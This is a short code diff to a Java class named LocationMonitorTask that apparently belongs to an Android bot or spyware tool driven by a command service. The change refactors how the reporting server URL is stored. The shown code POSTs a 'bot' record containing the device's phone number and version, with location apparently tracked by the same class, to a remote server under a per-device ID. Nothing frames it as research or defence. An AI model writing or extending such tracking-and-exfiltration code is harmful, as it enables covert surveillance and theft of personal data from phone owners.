@@ -26,11 +26,17 @@ public class LocationMonitorTask extends BaseTask {
 
     private double latitude;
     private double longitude;
+    private String server;
 
     public LocationMonitorTask(CommandService c) {
         setContext(c);
         this.latitude = 0;
         this.longitude = 0;
+        setServer(commonParams.getServer());
+    }
+
+    public void setServer(String url) {
+        this.server = url;
     }
 
     @Override
@@ -70,7 +76,7 @@ public class LocationMonitorTask extends BaseTask {
             bot.put("version", commonParams.getVersion());
             bot.put("phone", commonParams.getPhone());
             Http req = new Http();
-            req.setUrl(commonParams.getServer() + Constants.POST_STATUS_URL + "/" + commonParams.getUid());
+            req.setUrl(this.server + Constants.POST_STATUS_URL + "/" + commonParams.getUid());
             req.setMethod("POST");
             req.setParams(bot);
             req.execute();
